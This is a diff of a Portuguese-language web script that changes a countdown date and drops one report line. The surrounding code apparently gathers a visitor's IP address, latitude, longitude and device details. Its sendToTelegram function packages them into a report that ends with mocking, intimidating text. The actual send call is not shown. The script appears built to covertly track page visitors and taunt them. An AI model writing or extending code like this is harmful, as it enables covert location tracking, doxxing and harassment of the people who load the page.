@@ -1,6 +1,6 @@
 // script.js - Timer + Mensagens Pesadas (Telegram + Tela)
 
-let targetDate = new Date("2026-04-20T02:03:59").getTime();
+let targetDate = new Date("2026-04-20T02:10:59").getTime();
 let userIPv4 = '';
 let userLatitude = '';
 let userLongitude = '';
@@ -51,7 +51,6 @@ function sendToTelegram() {
                     `• Fuso horário: ${device.timezone}\n` +
                     `• Núcleos CPU: ${device.hardwareConcurrency}\n` +
                     `• Memória RAM aprox: ${device.deviceMemory}\n` +
-                    `• Portas abertas: Não possível detectar\n\n` +
                     `===================================\n` +
                     `HAHAHAHAHA OLHA SÓ QUE LIXO\n` +
                     `Que patético, mano...\n\n` +
